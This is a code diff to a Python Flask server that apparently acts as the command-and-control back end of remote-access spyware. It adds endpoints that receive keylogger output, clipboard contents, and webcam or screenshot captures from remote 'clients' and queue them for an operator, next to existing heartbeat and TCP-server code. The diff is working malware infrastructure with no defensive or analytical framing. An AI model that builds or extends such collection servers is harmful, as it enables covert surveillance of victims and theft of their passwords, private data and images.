@@ -525,6 +525,81 @@ def web_client_heartbeat():
         print(f"Error processing heartbeat: {e}")
         return {'error': str(e)}, 500
 
+@app.route('/api/keylog_data', methods=['POST'])
+def receive_keylog_data():
+    """Receive keylog data from web client"""
+    try:
+        data = request.get_json()
+        client_id = data.get('client_id')
+        keylog_data = data.get('keylog_data')
+        
+        if not all([client_id, keylog_data]):
+            return {'error': 'Missing required fields'}, 400
+            
+        # Store keylog data in response queue
+        response_queue.put((client_id, f"Keylog: {keylog_data}", "keylog"))
+        
+        print(f"Received keylog data from {client_id}")
+        return {'status': 'received'}
+        
+    except Exception as e:
+        print(f"Error receiving keylog data: {e}")
+        return {'error': str(e)}, 500
+
+@app.route('/api/clipboard_data', methods=['POST'])
+def receive_clipboard_data():
+    """Receive clipboard data from web client"""
+    try:
+        data = request.get_json()
+        client_id = data.get('client_id')
+        clipboard_data = data.get('clipboard_data')
+        timestamp = data.get('timestamp', time.time())
+        
+        if not all([client_id, clipboard_data]):
+            return {'error': 'Missing required fields'}, 400
+            
+        # Format clipboard data
+        formatted_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(timestamp))
+        clipboard_display = f"Clipboard updated at {formatted_time}:\n{clipboard_data}"
+        
+        # Store clipboard data in response queue
+        response_queue.put((client_id, clipboard_display, "clipboard_data"))
+        
+        print(f"Received clipboard data from {client_id}")
+        return {'status': 'received'}
+        
+    except Exception as e:
+        print(f"Error receiving clipboard data: {e}")
+        return {'error': str(e)}, 500
+
+@app.route('/api/image_data', methods=['POST'])
+def receive_image_data():
+    """Receive image data (webcam/screenshot) from web client"""
+    try:
+        data = request.get_json()
+        client_id = data.get('client_id')
+        command = data.get('command')
+        image_data = data.get('image_data')
+        message = data.get('message')
+        
+        if not all([client_id, command, image_data]):
+            return {'error': 'Missing required fields'}, 400
+            
+        # Store image data in response queue
+        if command == 'capture_webcam':
+            response_queue.put((client_id, message, "capture_webcam"))
+            response_queue.put((client_id, image_data, "webcam_image"))
+        elif command == 'capture_screenshot':
+            response_queue.put((client_id, message, "capture_screenshot"))
+            response_queue.put((client_id, image_data, "screenshot_image"))
+        
+        print(f"Received image data from {client_id} for command: {command}")
+        return {'status': 'received'}
+        
+    except Exception as e:
+        print(f"Error receiving image data: {e}")
+        return {'error': str(e)}, 500
+
 if __name__ == '__main__':
     # Start TCP server in a separate thread (only for local development)
     if not RAILWAY_MODE:
